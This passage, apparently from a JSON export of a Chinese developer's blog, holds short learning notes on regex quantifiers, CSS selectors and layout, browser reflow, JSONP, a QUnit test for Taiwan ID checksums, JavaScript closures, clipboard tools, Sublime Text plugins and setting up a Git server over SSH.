exactly n times.    |\n| {n,}              | {n,}?           | Match at least n times.   |\n| {n,m}             | {n,m}?          | Match from n to m times.  |\n+-------------------+-----------------+---------------------------+\n[在這邊有找到兩個名詞](http://stackoverflow.com/questions/2301285/what-do-lazy-and-greedy-mean-in-the-context-of-regular-expressions#answer-34806154)\n\n原本看不懂這兩個意思\n不過在這裡面有找到答案[一名之立，旬月踟躇](http://www.luanxiang.org/blog/archives/36.html)\n> 正在翻譯《精通正則表達式》，就遇到了這種情況：greedy quantifier控制的子表達式會捕獲儘可能多的匹配字符，lazy quantifier控制的子表達式會捕獲儘可能少的匹配字符。greedy的原意就是「貪婪」，lazy的原意就是「懶惰」，這樣直白地理解，儘管有些彆扭，倒也不成問題。\n可是，出現greedy和lazy的語境越來越多，直白的翻譯也就越來越不讓人滿意了，「Because of its greediness」，翻譯成「由於它的貪婪性」，簡直無法卒讀。但是，想來想去，實在找不到更好的辦法，總是被「貪」和「懶」兩個字所束縛，這些天，兩本厚厚的英漢詞典，和現代漢語詞典，都快翻盡了，仍然一無所獲。\n\n>終於在下班的路上想到，不妨另闢蹊徑，索性不出現「貪」和「懶」——greedy翻譯成「多數優先」，lazy翻譯成「少數優先」，反而流暢許多；而且，這樣一來，也不用「性」來「性」去的了，「Because of its greediness」直接翻譯成「因為它是多數優先的」，就OK。\n\n結論\n\n這個特性真的不錯，平常href=\"[^\"]+\"抓取括號的字，這樣非常簡短。Quantifier在後面加?找最短路徑這樣非常好記\n學這個小東西，相信regex技能又前進一大步XD\n\n\n參考來源\nRubular: a Ruby regular expression editor and tester\nhttp://www.rubular.com/\nrailroad diagram\nhttps://blog.longwin.com.tw/2013/01/regex-display-tool-2012/\nRailroad Diagrams\nhttps://regexper.com/documentation.html\nQuantifiers\nhttp://www.rexegg.com/regex-quickstart.html\nregex - What do lazy and greedy mean in the context of regular expressions? - Stack Overflow\nhttp://stackoverflow.com/questions/2301285/what-do-lazy-and-greedy-mean-in-the-context-of-regular-expressions\nLogdown\nhttps://logdown.com/account/posts/1774877/edit\n[正則表示式 正規表示式 (Regular expression)] 量符(Quantifier)：貪心量符、惰性量符的介紹\nhttp://notepad.yehyeh.net/Content/Program/RegularExpression/8.php\nRegex Quantifier Tutorial: Greedy, Lazy, Possessive\nhttp://www.rexegg.com/regex-quantifiers.html#cheat_sheet\nRegexper\nhttps://regexper.com/#href%3D%22(.*%3F)%22\n乱象，印迹 » 一名之立，旬月踟躇\nhttp://www.luanxiang.org/blog/archives/36.html\nGreedy quantifier\nhttp://stackoverflow.com/questions/2301285/what-do-lazy-and-greedy-mean-in-the-context-of-regular-expressions\nQuantifiers in Regular - Google 搜尋\nhttps://www.google.com.tw/search?q=Quantifiers+in+Regular&source=lnt&tbs=lr:lang_1zh-CN%7Clang_1zh-TW&lr=lang_zh-CN%7Clang_zh-TW&sa=X&ved=0ahUKEwiAm6WGpsvTAhXCHJQKHVa7Dm0QpwUIHQ&biw=1600&bih=809\n","tags":["Lazy quantifier"],"categories":["Regex"]},{"title":"[CSS] 不常用的CSS Selectors筆記","url":"%2Fblog%2F2017%2F04%2F29%2Flogdown%2F2017-04-29-1767277%2F","content":"前幾天有用到CSS ~，一直以為跟jQuery的`$().siblings()`是一樣的東西。\n結果不是\n在此記錄一下\n\n<!--more-->\n\n# CSS\n\nelement1+element2\n> 抓取element1下一個**element2**元素\n\nelement1~element2\n> 抓取element1之後**element2**元素\n\n[attribute]\n[attribute~=value]\n[attribute|=value]\n>https://www.w3schools.com/cssref/sel_attribute_value_lang.asp\n不知道怎麼解譯= =a\n\n[attribute^=value]\n[attribute$=value]\n[attribute*=value]\n:empty\n抓取標籤無任何東西\n\n\n::first-letter\n::first-line\n:first-of-type\n:in-range\ninput 在range內\n\n:invalid\n抓取input驗證type屬性不對\n\n:lang(language)\n:nth-child(n)\n:nth-last-child(n)\n:nth-last-of-type(n)\n:nth-of-type(n)\n:target\n>網址#abc，會對印抓取id=abc\njQuery也有此function\n\n-----下面沒有支援jQuery Selector\n:optional\n非必填的input\n\n:out-of-range\n> input超出 range\n\n:read-only\n:read-write\n-----\n::selection\n> 選取文字的顏色\n\n# jQuery (CSS Selector沒有)\n整理完才發現這麼多 囧\n\n:visible Selector\n:text Selector\n:target Selector\n:selected Selector\n:submit Selector\n:parent Selector\n:password Selector\n:lt() Selector\n:last Selector\n:input Selector\n:image Selector\n:hidden Selector\n:header Selector\n>h1,h2,h3,h4,h5\n\n:has() Selector\n:first Selector\n:even Selector\n:contains() Selector\n:animated Selector","tags":["Selectors"],"categories":["CSS"]},{"title":"Markdown 編輯器","url":"%2Fblog%2F2017%2F04%2F21%2Flogdown%2F2017-04-21-1731370%2F","content":"http://www.williamlong.info/archives/4319.html","categories":["Markdown"]},{"title":"[JavaScript] 網頁渲染的過程 (rendering pipline)","url":"%2Fblog%2F2017%2F04%2F21%2Flogdown%2F2017-04-21-javascript-web-page-rendering-rendering-pipline%2F","content":"前幾天在hahow上 [動畫互動網頁程式入門 (HTML/CSS/JS)](https://hahow.in/courses/56189df9df7b3d0b005c6639)\n這沒有要打廣告，不過老師真的教得不錯\n看到講師上到實作購物車時候\n其中某一個function利用多個(json)物件組出list清單\n而新增、刪除都是對物件操作，再透過function把list清單清空再繪製\n\n！！！！這看起來有問題，講師怎麼這樣做，這項目很多時，捲軸會有問題，這一定有bug\n<!--more-->\n\n不過還是簡單做一個小實驗好了，\n\nhttp://jsbin.com/fucoxur/edit?html,css,js,console,output\n結果\n![](https://scontent-tpe1-1.xx.fbcdn.net/v/t31.0-8/17917730_1726055847411527_4438982537059638344_o.jpg?oh=659fd51996f499d51f9650ab894b273a&oe=5997A193)\n\n怎麼想都想不到原因，就求救FB社群大大求救\nhttps://www.facebook.com/groups/f2e.tw/permalink/1271697796200916/\n\n  >  原本網頁渲染的過程 (rendering pipline) 會先執行 js 然後看 dom 跟 cssom 做成 render tree 然後畫在畫面上，你原先的作法等於 dom 被修改了兩次之後瀏覽器才開始跑剩餘的 rendering pipline 的流程 所以會依最後一次的結果 dom 的結果呈現\n然而你讀取 scrolltop 的屬性的時候 網頁會 reflow 算出 scrolltop 的值，這時瀏覽器就會被強迫進行一次繪製，就會有你原本預期的行為\n\nreflow不知道還有什麼情境，還能運用這個技巧，先記個筆記，怕忘記XD\n\n\n參考來源\nhttps://developers.google.com/web/fundamentals/performance/rendering/\nhttps://gist.github.com/paulirish/5d52fb081b3570c81e3a\ninspiregate.windspeaker.co/post/3959-the-browser-39-s-rendering-principle\n\n","tags":["rendering pipline"],"categories":["JavaScript"]},{"title":"[CSS] checkbox hack 模擬在網頁開視窗","url":"%2Fblog%2F2017%2F04%2F11%2Flogdown%2F2017-04-11-css-checkbox-hack-simulation-in-a-page-window%2F","content":"http://jsbin.com/hapineqoca/edit?css,output","tags":["checkbox hack"],"categories":["CSS"]},{"title":"[CSS] margin 排版問題(Collapsing margins)","url":"%2Fblog%2F2017%2F03%2F25%2Flogdown%2F2017-03-25-1640745%2F","content":"http://geekplux.com/2014/03/14/collapsing_margins.html\n垂直\nhttps://read01.com/gm0eN.html\ncss - Margin collapse on inline-block elements? - Stack Overflow\nhttp://stackoverflow.com/questions/25455932/margin-collapse-on-inline-block-elements\ncollapsed margin\nhttp://geekplux.com/2014/03/14/collapsing_margins.html\n\n\ninline-block不會有影響\n`block只影響上下，左右不會`\n先記錄先","tags":["margin"],"categories":["CSS"]},{"title":"[CSS]width:auto不等於100%","url":"%2Fblog%2F2017%2F03%2F25%2Flogdown%2F2017-03-25-1640260%2F","content":"最近在公司發現排版有問題，出現不該出現的捲軸\nCSS原本以為是width:100%，應該調一下box-sizing :border-sizing\n結果還是一樣有問題....\n\n後來發現auto，就不會有問題\n不過當然要思考這兩個屬性差異\n之後我認為width 沒設就是100%\n\n但後來Google一下，發現我錯了，預設是auto  (我也以為auto也是100%)\n> 'margin-left' + 'border-left-width' + 'padding-left' + 'width' + 'padding-right' + 'border-right-width' + 'margin-right' = width of containing block\nhttp://www.456bereastreet.com/archive/201112/the_difference_between_widthauto_and_width100/\n\n身為英文苦手不知道寫什麼意思，後來有爬到中文文章\n> 内容的寬度='margin-left' + 'border-left-width' + 'padding-left' + 'width' + 'padding-right' + 'border-right-width' + 'margin-right'\n如果'margin-left' + 'border-left-width' + 'padding-left' + 'padding-right' + 'border-right-width' + 'margin-right'比較大，就減小width的值，如果比較小呢，就增大width的值，使其滿足上面的表達式。\n\nhttp://m.studyofnet.com/news/965.html\n\n總結一下，上面意思就是width:auto後，寬度算法會`'margin-left' + 'border-left-width' + 'padding-left' + 'padding-right' + 'border-right-width' + 'margin-right'` >`width`，就會自動`縮減`width寬度；`'margin-left' + 'border-left-width' + 'padding-left' + 'padding-right' + 'border-right-width' + 'margin-right'` <`width`，就會自動`增加`width寬度\n簡單就是width:auto，不會備padding影響\n正常情行應該選用width:auto比較不會有排版的問題\n\n\n參考來源：\nhttp://www.456bereastreet.com/archive/201112/the_difference_between_widthauto_and_width100/\nhttp://m.studyofnet.com/news/965.html\nVisual formatting model details\nhttps://www.w3.org/TR/CSS21/visudet.html#inline-replaced-width\n\n","tags":["width"],"categories":["CSS"]},{"title":"[JavaScript] IE/W3C Event用法大不同","url":"%2Fblog%2F2017%2F03%2F10%2Flogdown%2F2017-03-10-javascript-ie-w3c-event-uses-different%2F","content":"整個就悲劇。","categories":["JavaScript"]},{"title":"[HTML]dd 裡面不能故放入dd標籤","url":"%2Fblog%2F2017%2F02%2F23%2Flogdown%2F2017-02-23-1458104%2F","content":"dd裡面不能放入dd標籤\n用了一整天的畫面問題\n在找漏掉結尾的html tag\n結果...採到這個雷 囧","tags":["dd"],"categories":["HTML"]},{"title":"[JavaScript]JSONP為什麼不能用POST","url":"%2Fblog%2F2016%2F12%2F26%2Flogdown%2F2016-12-26-1246428%2F","content":"為什麼JSONP不能使用POST?\n因為JSONP透過script標籤實作\n所以才沒辦法做\n<!--more-->\n\n就這樣:)\n\n參考來源:\nHow to use type: “POST” in jsonp ajax call\nhttp://stackoverflow.com/questions/4508198/how-to-use-type-post-in-jsonp-ajax-call\n使用 JSONP 跨站請求\nhttp://openhome.cc/Gossip/JavaScript/JSONP.html","tags":["JSONP"],"categories":["JavaScript"]},{"title":"[JavaScript] JSONP 小實作","url":"%2Fblog%2F2016%2F12%2F25%2Flogdown%2F2016-12-25-javascript-jsonp-fruit%2F","content":"很久之前，有看過JSONP文章，雖然有看一下實作原理都懂，但沒有動手做實作\n前幾天看到有人討論JSONP不能用POST方法去做\n這就讓我非常好奇是怎麼一回事\n<!--more-->\n\n首先，\n先從網路找一份PHP做JSONP範例\n```testJsonp.php\n  <?php\n $fname = $_GET['firstname'];\n         echo $_GET['callback'] . '(' . \"{'fullname' : 'Jeff Hansen'}\" . ')';\n?>\n```\n\n前端就先用jQuery AJAX實作吧\n只不過...我真的不太熟\n一開始就碰壁，不多說馬上筆記\n\n我很懶，在jQuery官網在開發工具做測試\n只不過...一直沒成功，讓我好懊腦\n\n看開發工具好像寫https關係\nhttps://developer.mozilla.org/zh-TW/docs/Security/MixedContent?utm_campaign=default&utm_medium=firefox-console-errors&utm_source=mozilla\n\n在http就正常了\n```js\n    $.ajax({\n         type: \"get\",\n         url: \"http://10.10.1.132/testJsonp.php?callback=?&firstname=Jefssf\",\n         dataType: \"jsonp\",\n         //json: 'callback',\n         //jsonpCallback: 'abc',//\"mycallback\"變數的值，沒指定時，jQuery隨機產生\n         success: function(res){\n             console.log(res);\n         },\n         error: function(){\n             alert('fail');\n         }\n});\n```\n`http://10.10.1.132/testJsonp.php?callback=jQuery1113042020808678791977_1482680736926&firstname=Jefssf&_=1482680736939`\n上面網址callback沒有指定的話，產生出來自動為亂數\najax裡的參數 jsonp為 `xxx`=? 參數命名\njsonpCallback=傳回來function命名 ，xxx=`?`參數，沒指定callback產生出來自動為亂數\n\n\n至於JSONP為什麼不能用POST，下次再做探討。\n\n\n相關資料\nJSONP跨網域傳送檔案：以POST方法實作 - 布丁布丁吃什麼？\nhttp://blog.pulipuli.info/2011/05/jsonppost.html\nSimple jQuery, PHP and JSONP example? - Stack Overflow\nhttp://stackoverflow.com/questions/6809053/simple-jquery-php-and-jsonp-example\njQuery.ajax() | jQuery API Documentation\nhttp://api.jquery.com/jQuery.ajax/\nsuccess_jsonpCallback\nhttp://www.cnblogs.com/know/archive/2011/10/09/2204005.html\nWorking with JSONP | jQuery Learning Center\nhttp://learn.jquery.com/ajax/working-with-jsonp/\n混和內容 - Security | MDN\nhttps://developer.mozilla.org/zh-TW/docs/Security/MixedContent?utm_campaign=default&utm_medium=firefox-console-errors&utm_source=mozilla\ncross\nhttp://www.css88.com/jqapi-1.9/jQuery.ajax/\nAttribute Ends With Selector [name$=\"value\"] | jQuery API中文文档(适用jQuery 1.0 - jQuery 3.0)\nhttp://www.css88.com/jqapi-1.9/attribute-ends-with-selector/\n使用 JSONP 跨站請求\nhttp://openhome.cc/Gossip/JavaScript/JSONP.html","tags":["JSONP"],"categories":["JavaScript"]},{"title":"用Qunit驗證身份證","url":"%2Fblog%2F2016%2F12%2F02%2Flogdown%2F2016-12-02-1163133%2F","content":"最近copy到公司身份證驗證程式有問題\n好險是上線前發現\n今天就簡單用測試程式寫了QUNIT測試程式\n\n<!--more-->\n\n```html\n<!DOCTYPE html>\n<html>\n<head>\n  <link href=\"https://code.jquery.com/qunit/qunit-git.css\" rel=\"stylesheet\" type=\"text/css\" />\n<script src=\"https://code.jquery.com/qunit/qunit-git.js\"></script>\n\n  <meta charset=\"utf-8\">\n  <meta name=\"viewport\" content=\"width=device-width\">\n  <title>JS Bin</title>\n</head>\n<body>\n <div id=\"qunit\"></div>\n <div id=\"qunit-fixture\"></div>\n</body>\n</html>\n\n<script>\n\n\nQUnit.module('測試身份證');\n\nfunction getTwID(){\n    //建立字母分數陣列(A~Z)\n    var city = new Array(\n         1,10,19,28,37,46,55,64,39,73,82, 2,11,\n        20,48,29,38,47,56,65,74,83,21, 3,12,30\n    )\n    //建立隨機身份證碼\n    var id = new Array();\n    id[0] = String.fromCharCode(Math.floor(Math.random() * (26)) + 65);\n    id[1] = Math.floor(Math.random() * (2)) + 1;\n    for(var i=2; i<9; i++){\n        id[i] = Math.floor(Math.random() * (9)) + 0;\n    }\n    //計算總分\n    var total = city[id[0].charCodeAt(0)-65];\n    for(var i=1; i<=8; i++){\n        total += eval(id[i]) * (9 - i);\n    }\n    //計算最尾碼\n    var total_arr = (total+'').split('');\n    var lastChar = eval(10-total_arr[total_arr.length-1]);\n    var lastChar_arr = (lastChar+'').split('');\n    //補上最後檢查碼\n    id[id.length++] = lastChar_arr[lastChar_arr.length-1];\n    //回傳結果\n    return id.join('');\n}\n\nfunction checkTwID(id){\n    //建立字母分數陣列(A~Z)\n    var city = new Array(\n         1,10,19,28,37,46,55,64,39,73,82, 2,11,\n        20,48,29,38,47,56,65,74,83,21, 3,12,30\n    )\n    id = id.toUpperCase();\n    // 使用「正規表達式」檢驗格式\n    if (id.search(/^[A-Z](1|2)\\d{8}$/i) == -1) {\n        alert('基本格式錯誤');\n        return false;\n    } else {\n        //將字串分割為陣列(IE必需這麼做才不會出錯)\n        id = id.split('');\n        //計算總分\n        var total = city[id[0].charCodeAt(0)-65];\n        for(var i=1; i<=8; i++){\n            total += eval(id[i]) * (9 - i);\n        }\n        //補上檢查碼(最後一碼)\n        total += eval(id[9]);\n        //檢查比對碼(餘數應為0);\n        return ((total%10 == 0 ));\n    }\n}\n\nvar chartId_list = [];\n\nfor(var i = 0; i < 1000;i++){\n  chartId_list.push(getTwID());\n}\n//遇到動態產生錯誤問題，解決方法\n//http://stackoverflow.com/questions/36021953/qunit-test-in-loop-index-always-the-same\nfor(let i = 0; i < 1000; i++){\n  QUnit.test( \"驗證ID:\" + chartId_list[i], function( assert ) {\n    assert.ok( checkTwID(chartId_list[i]), \" 網路方法 Passed!\" );\n  });\n}\n</script>\n```\n\n#備忘錄\n之前動態產生測試會有問題\n有想用閉包解決，但沒有想到怎麼用  x.x\n最後還是靠stackoverflow查到\n果然我還需要磨練阿~~~~","tags":["Qunit"],"categories":["JavaScript"]},{"title":"不用程式寫爬蟲記錄(Kimono Desktop)","url":"%2Fblog%2F2016%2F11%2F27%2Flogdown%2F2016-11-27-1147900%2F","content":"前幾天看到[無痛爬梳自己來，用 Google Spreadsheet 爬取網頁資料](http://blog.infographics.tw/2016/11/google-spreadsheet-data-scraping/)\n就想之前的Kimono\n但現在官網要收掉這個服務\n不過有官網友留下kimono desktop edition 離線版程式使用(只有MAC和Windows)\n目前不知道有沒有辦法移植到Linux上面玩\n\n|                              | kimonolabs.com           | kimono for desktop\n------------------------------|---------------------------|----------------------\nCreate APIs with Chrome Ext\t\t|v                          |\nCreate APIs with Bookmarklet\t|\tv                         |v\nManage and configure APIs\t\t  |v                          |v\nRun APIs manually\t\t          |v                          |\nRun APIs on a schedule        |v                          |\nCloud hosted API endpoints    |\t\t                        |v (w/ Firebase)\nCrawling & Pagination\t\t      |v                          |v\nGet data behind a login\t      |\tv                         |v\nKimono Apps / Blocks\t\t      |v                          |\nGoogle sheets integration     |v\nWebhooks & Email alerts\t\t    |v\nSave scraped data to file\t    |\tv                        |v\nCSV & RSS output\t\t          |v                         | v\n\n當然離線版沒有這麼多功能，可惜沒有排程可以用\n但發現他程式透過NodeJS去寫，好像可以透過API方式去實作\n在此先記錄一下筆記\n\n\n<!--more-->\n\n\n首先，安裝kimono desktop edition 和chrome extension\n相關套件網路就一堆，我就先偷懶拉o.<\n[不會寫程式也能爬，Kimono 幫你把網站變資料](http://blog.infographics.tw/2015/04/crawl-data-without-code-using-kimonolabs/)\n\nAPI建立好，開kimono desktop edition可以看到剛剛家加入的任務\n![k1.png](http://user-image.logdown.io/user/8284/blog/8171/post/1147900/4xl8wny7RwWp7WYxUY9l_k1.png)\n\n\n![k2.png](http://user-image.logdown.io/user/8284/blog/8171/post/1147900/hJk274dUQWevRRnnZ50e_k2.png)\n\n\n![k3.png](http://user-image.logdown.io/user/8284/blog/8171/post/1147900/yIHnKB00Ta6ZkdISSZ7V_k3.png)\n按下Start Crawl 可執行爬蟲\n\n後來我發現kimono desktop edition可以開啟開發者工具\n發現執行Web API可以跑爬蟲\n看來排程執行爬蟲指日可待XD\n\n![k4.png](http://user-image.logdown.io/user/8284/blog/8171/post/1147900/0oIV98RT9K5ZIULkibM3_k4.png)\n```\nPOST /ws/startcrawl/ HTTP/1.1\nHost: localhost:3000\nOrigin: http://localhost:3000\nX-DevTools-Emulate-Network-Conditions-Client-Id: 93A1E1D6-2642-4DD4-84B2-5BAE0E75261C\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) kimono-desktop/1.0.5 Chrome/45.0.2454.85 Electron/0.35.4 Safari/537.36\nContent-Type: application/json;charset=UTF-8\nReferer: http://localhost:3000/apis/b8ed4oy2\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-TW\nCache-Control: no-cache\nPostman-Token: 0b770020-6467-cff2-5923-6300dc330def\n\n{\"apiid\":\"b8ed4oy2\"}\n```\n\n![k5.png](http://user-image.logdown.io/user/8284/blog/8171/post/1147900/lHJfAnWyQ2C8wbHncI7t_k5.png)\n\n看爬蟲API任務的狀態WEB API\n","tags":["Kimono"],"categories":["實用工具"]},{"title":"[JavaScript]閉包筆記記錄","url":"%2Fblog%2F2016%2F10%2F02%2Flogdown%2F2016-10-02-javascript-closure-note%2F","content":"之前看JavaScript閉包文章都看不懂，前陣子買了FB社群推薦的「忍者JavaScript開發技巧探秘」\n最近先跳著看到閉包單元，有了解一點東西跟以前錯誤的觀念，就先來這邊做一下筆記。\n免得之後全部忘光光了XD\n\n<!--more-->\n\n首先，前面介紹每個function都是閉包(我驚呆了)\n我這邊就先舉例範例\n```js\nvar value = 'hello world'\nfunction a1(){\n    console.log(value)  // print hello world\n}\n```\n相信大家都知道這一定會顯示hello world吧\n但我覺得大家都會不太清楚這是閉包\n以下是我記錯當時錯誤觀念\n> 前陣子，跟同事討論這個問題，他認為JavaScript在function外面就是全域變數\n所以值也會抓到。\n我認為是因為當function沒有宣告變數，會自動抓取window.value\n不過跟我同事一樣，也是全域變數觀念。\n\n以前有看到在瀏覽器沒有下var變數，變數會寫在window物件上\n我以為同理可證跟function一模一樣，但測試結果也是這樣\n\n以前，看JavaScript大全完全看不懂閉包這單元\n今天終於開竅了。\n\n**簡單來講閉包就是function抓取變數，先從function內抓取變數，假如function內沒變數，會從外面抓取變數**\n他有著call by reference觀念\n詳細：http://eddychang.me/blog/javascript/84-js-clousure.html\n上面網站圖片和內容寫得還滿清楚的\n\n好了，再來進入番外篇\nJavaScript怎麼會有call by reference\n我一直以為JavaScript都是call by value\n好險，看到上面這個文章\nJavaScript有一個形態是call by reference\n就是Object物件就是call by reference\n\n```\nvar obj = {a:1}\nfunction a(value){\n    value.a=3;\n}\na(obj);\nconsole.log(obj);   // print Object  {a:3}\n```\n以前好在沒有採到這個雷，下次應該不會踩到XD\n\n然後，接下來突然想到以前看不懂的閉包[文章](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Closures#Creating_closures_in_loops_A_common_mistake)\n```html\n<p id=\"help\">Helpful notes will appear here</p>\n<p>E-mail: <input type=\"text\" id=\"email\" name=\"email\"></p>\n<p>Name: <input type=\"text\" id=\"name\" name=\"name\"></p>\n<p>Age: <input type=\"text\" id=\"age\" name=\"age\"></p>\n```\n\n```js\nfunction showHelp(help) {\n  document.getElementById('help').innerHTML = help;\n}\n\nfunction setupHelp() {\n  var helpText = [\n      {'id': 'email', 'help': 'Your e-mail address'},\n      {'id': 'name', 'help': 'Your full name'},\n      {'id': 'age', 'help': 'Your age (you must be over 16)'}\n    ];\n\n  for (var i = 0; i < helpText.length; i++) {\n    var item = helpText[i];\n    document.getElementById(item.id).onfocus = function() {\n      showHelp(item.help);\n    }\n  }\n}\n\nsetupHelp();\n```\n這下能理解item.help為什麼抓到都是helpText最後面一個\n因為每個迴圈實做閉包\n但是setupHelp()跑完item變數就會存在於閉包，不會消失(但外在function沒法存取這個變數)\n所以每個onfocus都會跑出`Your age (you must be over 16`\n了解過去不了解的東西，可喜可賀^o^\n\n再來，番外篇2\n[文章](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Closures#Creating_closures_in_loops_A_common_mistake)上面有寫let可以解決閉包範例\n所以就爬文一下\n>`let`好像類似Java變數生活周期是在{}結束\n\n*上述只是猜測*\n```js\nvar a = 2;\nif(a==2){\n   let a = 1\n   console.log(a);  // print 1\n}\n console.log(a);  // print 2\n ```\n有空深入了解\n\n聽說閉包是JavaScript精華，目前提到的東西可能還算閉包最基礎的東西\n像scope chain、匿名函式......都還沒研究。\n等了解後再記錄筆記吧\n\n參考：\n《你不知道的JavaScript》整理（一）——作用域、提升與閉包 - 每日頭條\nhttps://kknews.cc/other/6bmzqq.html\n闭包 - JavaScript | MDN\nhttps://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Closures#Creating_closures_in_loops_A_common_mistake\nJavascript 閉包 Closure « Guang's Note\nhttp://guang.logdown.com/posts/277383-javascript-closure\nJavaScript筆記: function is call by \"value\" or call by \"reference\"? « 弱弱前端碎碎念\nhttp://heyyou.logdown.com/posts/145054\nTag : javascript « 弱弱前端碎碎念\nhttp://heyyou.logdown.com/tags/javascript\n從ES6開始的JavaScript學習生活 · GitBook\nhttps://www.gitbook.com/book/eyesofkids/javascript-start-from-es6/details\nrefer\nhttp://eddychang.me/blog/javascript/84-js-clousure.html\n深入理解什麼是javascript中的閉包。_StackDoc\nhttp://fanli7.net/a/caozuoxitong/OS/20110830/125313.html\nlet\nhttps://developer.mozilla.org/zh-TW/docs/Web/JavaScript/Reference/Statements/let#let_%E7%9A%84%E4%BD%9C%E7%94%A8%E5%8D%80%E5%A1%8A","tags":["reference"],"categories":["JavaScript"]},{"title":"好用的剪貼簿","url":"%2Fblog%2F2016%2F09%2F11%2Flogdown%2F2016-09-11-863647%2F","content":"最近公司專案是用西班牙語\n所以要一直參考文件貼到別的地方\n一直複製 → 貼上  →複製 → 貼上→複製 → 貼上→複製 → 貼上→複製 → 貼上→複製 → 貼上...  ~~無限迴圈~~\n之前一些都靠Sublime Text還hold的住\n現在就有點麻煩，速度感覺有變慢\n就想以前有看到剪貼簿工具\n但覺得用不太到...\n現在發現還滿好用的\n\n<!--more-->\n\n目前有試用Ditto、HamsinClipboard\n\nDitto是免費開源軟體\nCtrl+` 可呼叫清單\n沒有次數限制\n\n*但沒有強力貼上功能\n\nHamsinClipboard\n比較喜歡他的Incremental paste\n就是可以複製 → 複製→複製→複製→複製 → 貼上→貼上 → 貼上→ 貼上→ 貼上\n\n可惜...有十個限制\n但還是能加減用XD\n\nClipX好像win7 64bit換閃退\nClipMate 聽說這邊更強...\n但他並非免費軟體，這邊我就不介紹了\n他的順序粘貼（Incremental paste）真的是最簡單又好用\n\nFirefox Easy Copy\n大量開分頁複製Tittle和URL需要大量時間\n所以每次隨意筆記都要花一堆時間\n\n現在Easy Copy 套件能解決我的問題\n但好像沒辦法做到換行...\n沒關係，Sublime Text hold的住XD\n\n------\n參考來源\n\n剪贴板增强软件综述:CLCL,ClipX,Ditto等（更新CLCL v2.0） | 善用佳软\nhttps://xbeta.info/clipx-clcl-ditto.htm\n\n\n\n\n**2020-01-31**\n[剪贴板增强软件综述:CLCL,ClipX,Ditto等（更新CLCL v2.0） – 善用佳软](https://xbeta.info/clipx-clcl-ditto.htm)\n\n最近想找美費能做順序粘貼（Incremental paste）\n有看到幾個介紹使用測試\n\nClipboard Magic 找不到這個功能(說不定是我沒找到)\n不知道是不是 Win 7 關係不太相容，所以程式用起來非常卡\n\n[Chocolatey Software | Clipjump 12.5](https://chocolatey.org/packages/clipjump)\n後來看到下面的人推薦使用 Clipjump  \n雖然沒有找到類似 clipmate 順序粘貼\n但發現連續 Ctrl + C ，再**貼上的時候 Ctrl+ V 時候，放掉V後Ctrl不要放掉再按V**\n這時候會有跳出提示是什麼字\n這時候會發現只能下一步\n貼錯要回去怎麼辦??\n`V改成C`會往前貼之前的東西\n這個就有類似順序粘貼功能\n\n其實功能還滿多的，但缺乏 GUI 介面\n所以可能第一次要摸了老半天才知道要怎麼用\n\n","categories":["實用工具"]},{"title":"我的Sublime Text 3套件分享","url":"%2Fblog%2F2016%2F08%2F23%2Flogdown%2F2016-08-23-801285%2F","content":"List\n* AdvancedNewFile (新增檔案用)\n* Alignment       (對齊用)\n* All Autocomplete  (自動載入別的開的檔案tip)\n* Bootstrap 3 Snippets\n* BracketHighlighter  (提示/修改/移除外框符號，算還實用)\n* ConvertToUTF8       (還沒utf-8專案用)\n* DocBlocker          (註解用)\n* Emmet               (html專用)\n* IMESupport           (中文輸入法專用)\n* jQuery\n* PHP-Twig\n* Pretty JSON          (你的json會變很好看)\n* SqlBeautifier        (你的sql會變的很好看XD)\n* StringEncode         (html轉一些符號，很實用)\n* Text Pastry          (1 to x ，懶人專用，我很愛)\n\n\n","categories":["實用工具"]},{"title":"在Linux架Git Server(ssh)","url":"%2Fblog%2F2016%2F08%2F23%2Flogdown%2F2016-08-23-in-linux-git-server-ssh%2F","content":"最近公司接了一個案子，我被分配到架設Git Server工作\n架設成功，就在這裡做簡單的筆記。\n由於網路教的都大同小異，只需理解為什麼這樣做\n用自己的需求，基本上實作應該都能做出來\n\n<!--more-->\n首先，先建立git帳號\n\n```\nadduser git\n```\n\n然後，Git Server說穿了就是用ssh方式做存取\n所以必需用RSA金鑰登入(不需打密碼這種)，多虧了這次我終於了解ssh金鑰登入方式\n```client|sh\nssh-keygen -t rsa\n```\n家目錄就會產生了.ssh資料夾\n裡面有id_rsa.pub id_rsa兩個檔案(前者是公開金鑰[給Server]、後者是私密金鑰[Clinet自己保留])\n\n在Server的git家目錄把.ssh\\authorized_keys加入公開金鑰\n或 上傳公開金鑰直接用指令加入\n```\ncat /tmp/id_rsa.john.pub >> ~/.ssh/authorized_keys\n```\n**注意：.ssh資料夾必需要為700，authorized_keys必需為600或root owner**\n\n此時可以進行ssh登入嘗式，能登入git帳號成功，就差不多了。\n\n\n在家目錄建立\n```\nmkdir xxx.git\ncd xxx.git\ngit --bare init\n```\n\n好了，接下來就做commit上去試試\n```\n$ cd myproject\n$ git init\n$ git add .\n$ git commit -m 'initial commit'\n$ git remote add origin git@xxx.xxx.xxx.xx:xxx.git\n$ git push origin master\n```\n\n完畢。\n\n什麼，你說還沒完XD，由於安全性的問題\ngit應該不該登入帳號\n```\nsudo vim /etc/passwd\ngit:x:1000:1000::/home/git:/usr/bin/git-shell\n```\n\n好了這樣就完成了。\n\n\n你說還有https、Gitosis和GitLab\n各位勇者就靠你們研究嘍XD\n\n在這次實作，我發現可以用scp指令傳檔案上去\npietty 0.3可以傳(拖移檔案)，以後傳檔案不用在開ftp了(淚)\n\n參考來源：\n伺服器上的 Git - 架設伺服器\nhttps://git-scm.com/book/zh-tw/v1/%E4%BC%BA%E6%9C%8D%E5%99%A8%E4%B8%8A%E7%9A%84-Git-%E6%9E%B6%E8%A8%AD%E4%BC%BA%E6%9C%8D%E5%99%A8\n在 Linux 中架設 Git 伺服器教學（使用 SSH 加密傳輸）\nhttps://blog.gtwang.org/linux/linux-git-server-using-ssh/\n給windows使用者的簡易Git環境架設 (linux架設)\nhttp://eric0806.blogspot.tw/2014/05/ubuntu-git-server-for-small-team-who-use-windows-os.html\nUbuntu架設GitServer\nhttp://samchu.logdown.com/posts/777348-set-up-ubuntu-gitserver\nCentOS架設GitServer\nhttp://samchu.logdown.com/posts/778052-set-up-centos-gitserver\nFedora, CentOS ssh 登入到遠端 Server 